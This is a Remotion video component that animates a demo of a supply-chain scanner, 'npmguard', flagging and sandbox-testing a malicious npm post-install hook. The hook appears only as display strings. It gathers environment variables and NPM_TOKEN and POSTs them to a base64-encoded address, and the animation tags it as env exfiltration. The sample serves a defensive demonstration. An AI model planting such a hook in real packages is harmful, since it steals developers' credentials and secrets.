import {
  AbsoluteFill,
  interpolate,
  spring,
  useCurrentFrame,
  useVideoConfig,
  Easing,
  staticFile,
} from "remotion";
import { Video } from "@remotion/media";
import { colors, fonts, springs } from "../lib/theme";

// ── BEAT 1: Code scan ──
const CODE_LINES = [
  { text: 'const http = require("http");', suspicious: false },
  { text: 'const os = require("os");', suspicious: false },
  { text: "", suspicious: false },
  { text: "module.exports = async () => {", suspicious: false },
  { text: '  const d = Buffer.from("aHR0cDovLzE5Mi4x", "base64");', suspicious: true },
  { text: "", suspicious: false },
  { text: "  const payload = {", suspicious: true },
  { text: "    env: process.env,", suspicious: true },
  { text: "    host: os.hostname(),", suspicious: true },
  { text: "    token: process.env.NPM_TOKEN", suspicious: true },
  { text: "  };", suspicious: true },
  { text: "", suspicious: false },
  { text: '  http.request(d, { method: "POST",', suspicious: true },
  { text: "    body: JSON.stringify(payload) });", suspicious: true },
  { text: "};", suspicious: false },
];
const LINE_H = 46;

// ── BEAT 2: Sandbox pentest ──
const SANDBOX_LINES: {
  frame: number;
  text: string;
  color: string;
  isCapture?: boolean;
  isFinal?: boolean;
}[] = [
  { frame: 0, text: "$ npmguard pentest --sandbox", color: "rgba(255,255,255,0.5)" },
  { frame: 12, text: "Spinning up isolated container...", color: colors.investigating },
  { frame: 28, text: "Executing post-install hook...", color: "rgba(255,255,255,0.6)" },
  { frame: 45, text: "", color: "" },
  { frame: 48, text: '▸ http.request("192.168.1.1")    → INTERCEPTED', color: colors.danger, isCapture: true },
  { frame: 68, text: "▸ process.env.NPM_TOKEN          → CAPTURED", color: colors.danger, isCapture: true },
  { frame: 85, text: "▸ os.hostname()                   → CAPTURED", color: colors.suspected, isCapture: true },
  { frame: 100, text: "", color: "" },
  { frame: 105, text: "EXPLOIT CONFIRMED — env exfiltration via POST", color: colors.danger, isFinal: true },
];

const BEAT_SWITCH = 115;

export const AgentFeed: React.FC = () => {
  const frame = useCurrentFrame();
  const { fps } = useVideoConfig();

  const inBeat1 = frame < BEAT_SWITCH;
  const beat2Frame = frame - BEAT_SWITCH;

  // ── Shared: 3D perspective ──
  const rotateY = interpolate(frame, [0, 240], [-6, 6], { extrapolateRight: "clamp" });
  const rotateX = interpolate(frame, [0, 240], [2, -2], { extrapolateRight: "clamp" });

  // ── BEAT 1 animations ──
  const beat1Blur = interpolate(frame, [0, 30], [12, 0], {
    extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: Easing.out(Easing.quad),
  });
  const beat1Opacity = inBeat1
    ? interpolate(frame, [0, 20, BEAT_SWITCH - 12, BEAT_SWITCH], [0, 1, 1, 0], {
        extrapolateLeft: "clamp", extrapolateRight: "clamp",
      })
    : 0;

  const scannerY = interpolate(frame, [30, 100], [-10, CODE_LINES.length * LINE_H + 20], {
    extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: Easing.inOut(Easing.quad),
  });

  const highlightOpacity = (lineIndex: number) => {
    const lineY = lineIndex * LINE_H;
    if (scannerY < lineY) return 0;
    return interpolate(scannerY - lineY, [0, 50], [0, 1], { extrapolateRight: "clamp" });
  };

  // ── BEAT 2 animations ──
  const beat2Opacity = !inBeat1
    ? interpolate(beat2Frame, [0, 15], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" })
    : 0;
  const beat2Blur = !inBeat1
    ? interpolate(beat2Frame, [0, 20], [8, 0], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: Easing.out(Easing.quad) })
    : 8;

  const borderPulse = !inBeat1
    ? interpolate(Math.sin(beat2Frame * 0.15), [-1, 1], [0.15, 0.35])
    : 0.15;

  const exploitFlash = !inBeat1
    ? interpolate(beat2Frame, [105, 108, 115], [0, 0.15, 0], { extrapolateLeft: "clamp", extrapolateRight: "clamp" })
    : 0;

  // ── Shared ──
  const activePhase = frame < 105 ? 0 : frame < 185 ? 1 : frame < 215 ? 2 : 3;
  const phases = ["Scan", "Pentest", "Proof", "Done"];
  const bgZoom = interpolate(frame, [0, 240], [1.05, 1.15], { extrapolateRight: "clamp" });
  const zoom = interpolate(frame, [0, 240], [0.92, 1.02], { extrapolateRight: "clamp" });

  const PhaseBar = () => (
    <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
      {phases.map((phase, i) => (
        <div key={i} style={{ display: "flex", alignItems: "center", gap: 4 }}>
          <div style={{ width: 22, height: 3, borderRadius: 2, backgroundColor: i < activePhase ? colors.safe : i === activePhase ? colors.investigating : "rgba(255,255,255,0.08)", opacity: i === activePhase ? interpolate(Math.sin(frame * 0.2), [-1, 1], [0.5, 1]) : 1 }} />
          <span style={{ fontFamily: fonts.mono, fontSize: 13, color: i < activePhase ? colors.safe : i === activePhase ? colors.investigating : "rgba(255,255,255,0.15)", textTransform: "uppercase" as const }}>{phase}</span>
        </div>
      ))}
    </div>
  );

  return (
    <AbsoluteFill style={{ backgroundColor: "#000" }}>
      {/* Background video */}
      <AbsoluteFill style={{ transform: `scale(${bgZoom})` }}>
        <Video
          src={staticFile("bg-terminal.mp4")}
          muted
          style={{ width: "100%", height: "100%", objectFit: "cover", filter: `brightness(${inBeat1 ? 0.3 : 0.2}) saturate(0.5) contrast(1.1)` }}
        />
      </AbsoluteFill>

      {/* ═══ BEAT 1: Code Scanner ═══ */}
      <AbsoluteFill style={{ perspective: 1200, justifyContent: "center", alignItems: "center", opacity: beat1Opacity }}>
        <div style={{ width: 1650, transform: `scale(${zoom}) rotateY(${rotateY}deg) rotateX(${rotateX}deg)`, filter: `blur(${beat1Blur}px)`, transformStyle: "preserve-3d" as const }}>
          <div style={{ backgroundColor: "rgba(15, 13, 10, 0.92)", borderRadius: 16, border: "1px solid rgba(255,255,255,0.06)", boxShadow: "0 30px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03)", overflow: "hidden" }}>
            {/* Header */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "12px 24px", borderBottom: "1px solid rgba(255,255,255,0.05)", background: "rgba(255,255,255,0.02)" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <span style={{ fontFamily: fonts.mono, fontSize: 22, fontWeight: 700, color: colors.accent }}>npmguard</span>
                <span style={{ fontFamily: fonts.mono, fontSize: 22, color: "rgba(255,255,255,0.3)" }}>auditing</span>
                <span style={{ fontFamily: fonts.mono, fontSize: 22, color: "rgba(255,255,255,0.6)" }}>axios@1.8.0</span>
              </div>
              <PhaseBar />
            </div>
            <div style={{ fontFamily: fonts.mono, fontSize: 18, color: "rgba(255,255,255,0.2)", padding: "12px 24px 8px 80px", letterSpacing: "0.05em" }}>lib/post-install.js</div>
            <div style={{ padding: "0 8px 20px", position: "relative" }}>
              {CODE_LINES.map((line, i) => {
                const susOp = line.suspicious ? highlightOpacity(i) : 0;
                const isH = line.suspicious && susOp > 0.5;
                return (
                  <div key={i} style={{ display: "flex", alignItems: "center", height: LINE_H, paddingLeft: 12, paddingRight: 24, backgroundColor: isH ? `rgba(248, 113, 113, ${susOp * 0.06})` : "transparent", borderLeft: isH ? `3px solid rgba(248, 113, 113, ${susOp})` : "3px solid transparent" }}>
                    <span style={{ fontFamily: fonts.mono, fontSize: 20, color: isH ? `rgba(248, 113, 113, ${susOp * 0.6})` : "rgba(255,255,255,0.12)", width: 40, textAlign: "right" as const, marginRight: 20 }}>{i + 1}</span>
                    <span style={{ fontFamily: fonts.mono, fontSize: 26, color: isH ? colors.danger : "rgba(255,255,255,0.85)", fontWeight: isH ? 600 : 400 }}>{line.text}</span>
                  </div>
                );
              })}
              {frame >= 30 && frame <= 110 && (
                <div style={{ position: "absolute", left: 60, right: 24, top: 28 + scannerY, height: 2, background: `linear-gradient(90deg, ${colors.investigating}, rgba(96, 165, 250, 0.3), transparent)`, opacity: interpolate(Math.sin(frame * 0.3), [-1, 1], [0.5, 0.9]), boxShadow: `0 0 30px ${colors.investigating}` }} />
              )}
            </div>
          </div>
        </div>
      </AbsoluteFill>

      {/* ═══ BEAT 2: Sandbox Pentest ═══ */}
      <AbsoluteFill style={{ perspective: 1200, justifyContent: "center", alignItems: "center", opacity: beat2Opacity }}>
        <div style={{ width: 1400, transform: `scale(${zoom}) rotateY(${rotateY * 0.5}deg) rotateX(${rotateX * 0.5}deg)`, filter: `blur(${beat2Blur}px)`, transformStyle: "preserve-3d" as const }}>
          {/* Sandbox container — dashed border = containment */}
          <div style={{ backgroundColor: "rgba(15, 13, 10, 0.92)", borderRadius: 16, border: `2px dashed rgba(248, 113, 113, ${borderPulse})`, boxShadow: `0 30px 80px rgba(0,0,0,0.6), 0 0 60px rgba(248, 113, 113, ${borderPulse * 0.3})`, overflow: "hidden" }}>
            {/* Sandbox header */}
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "14px 28px", borderBottom: "1px solid rgba(248, 113, 113, 0.1)", background: "rgba(248, 113, 113, 0.03)" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
                <div style={{ width: 10, height: 10, borderRadius: 3, border: "2px solid rgba(248, 113, 113, 0.5)", position: "relative" }}>
                  <div style={{ position: "absolute", inset: 2, borderRadius: 1, backgroundColor: `rgba(248, 113, 113, ${borderPulse})` }} />
                </div>
                <span style={{ fontFamily: fonts.mono, fontSize: 26, fontWeight: 700, color: colors.danger }}>SANDBOX</span>
                <span style={{ fontFamily: fonts.mono, fontSize: 20, color: "rgba(255,255,255,0.3)" }}>isolated environment</span>
              </div>
              <PhaseBar />
            </div>

            {/* Terminal output */}
            <div style={{ padding: "24px 36px 32px" }}>
              {SANDBOX_LINES.map((line, i) => {
                if (beat2Frame < line.frame) return null;
                const localF = beat2Frame - line.frame;
                if (!line.text) return <div key={i} style={{ height: 14 }} />;

                const lineOp = interpolate(localF, [0, 8], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" });
                const lineY = interpolate(localF, [0, 8], [10, 0], { extrapolateLeft: "clamp", extrapolateRight: "clamp", easing: Easing.out(Easing.quad) });

                const arrowScale = line.isCapture
                  ? spring({ frame: localF - 2, fps, config: { damping: 12, stiffness: 200 } })
                  : 1;

                return (
                  <div key={i} style={{ opacity: lineOp, transform: `translateY(${lineY}px)`, marginBottom: 10, display: "flex", alignItems: "center" }}>
                    <span style={{ fontFamily: fonts.mono, fontSize: line.isFinal ? 32 : 28, fontWeight: line.isFinal ? 700 : line.isCapture ? 600 : 400, color: line.color }}>
                      {line.text}
                    </span>
                    {line.isCapture && (
                      <div style={{ marginLeft: 14, width: 10, height: 10, borderRadius: "50%", backgroundColor: colors.danger, transform: `scale(${arrowScale})`, boxShadow: `0 0 14px ${colors.danger}` }} />
                    )}
                  </div>
                );
              })}
            </div>

            {/* Capabilities bar */}
            {beat2Frame > 90 && (
              <div style={{ padding: "14px 36px 18px", borderTop: "1px solid rgba(255,255,255,0.05)", display: "flex", gap: 12, opacity: interpolate(beat2Frame, [90, 100], [0, 1], { extrapolateLeft: "clamp", extrapolateRight: "clamp" }) }}>
                <span style={{ fontFamily: fonts.mono, fontSize: 18, color: "rgba(255,255,255,0.3)", textTransform: "uppercase" as const, letterSpacing: "0.05em" }}>Capabilities:</span>
                {["network", "env_vars", "filesystem"].map((cap, i) => {
                  const capScale = spring({ frame: beat2Frame - (92 + i * 5), fps, config: springs.snappy });
                  return (
                    <div key={cap} style={{ fontFamily: fonts.mono, fontSize: 20, color: colors.danger, padding: "6px 18px", borderRadius: 12, border: "1px solid rgba(248, 113, 113, 0.25)", background: "rgba(248, 113, 113, 0.06)", transform: `scale(${capScale})`, textTransform: "uppercase" as const, letterSpacing: "0.03em" }}>
                      {cap}
                    </div>
                  );
                })}
              </div>
            )}
          </div>
        </div>
      </AbsoluteFill>

      {/* Exploit flash */}
      <AbsoluteFill style={{ backgroundColor: colors.danger, opacity: exploitFlash, pointerEvents: "none" }} />

      {/* Vignette */}
      <div style={{ position: "absolute", inset: 0, background: "radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.5) 100%)", pointerEvents: "none" }} />
    </AbsoluteFill>
  );
};
